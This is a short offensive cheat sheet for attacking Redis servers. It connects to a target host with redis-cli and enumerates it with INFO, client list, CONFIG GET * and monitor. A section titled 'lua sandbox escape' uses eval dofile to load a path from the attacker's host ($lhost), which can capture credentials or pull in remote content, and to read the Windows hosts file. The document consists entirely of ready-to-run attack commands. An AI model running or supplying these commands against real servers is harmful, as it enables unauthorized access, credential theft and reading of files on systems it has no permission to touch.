# connect

```bash
redis-cli -h "$rhost"
```

# enumerate

```bash
INFO
client list
CONFIG GET *
monitor
```

# lua sandbox escape

```bash
eval "dofile('//$lhost/asdf')" 0
eval "dofile('C:\\\Windows\\\System32\\\drivers\\\etc\\\hosts')" 0
```
